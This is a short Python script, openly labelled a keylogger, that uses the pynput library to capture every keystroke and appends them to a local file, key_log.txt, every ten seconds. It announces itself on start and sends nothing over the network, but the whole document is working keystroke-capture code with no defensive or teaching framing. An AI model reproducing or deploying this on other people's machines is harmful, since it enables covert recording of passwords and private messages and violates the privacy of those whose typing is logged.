import pynput.keyboard
import threading

# Global variable to store keystrokes
key_log = ""

# Callback function for key presses
def on_press(key):
    global key_log
    try:
        key_log += key.char  # Attempt to append character keys
    except AttributeError:
        key_log += f'[{key}]'  # Handle special keys like [Shift], [Enter]

# Function to write keystrokes to a file
def write_to_file():
    global key_log
    with open("key_log.txt", "a") as log_file:
        log_file.write(key_log)
        key_log = ""  # Clear the log buffer after writing

# Function to repeatedly save the log
def save_log_periodically():
    write_to_file()
    threading.Timer(10, save_log_periodically).start()  # Save every 10 seconds

if __name__ == "__main__":
    print("Keylogger running... Press Ctrl+C to stop.")

    # Start saving log periodically
    save_log_periodically()

    # Start listening for keystrokes
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()
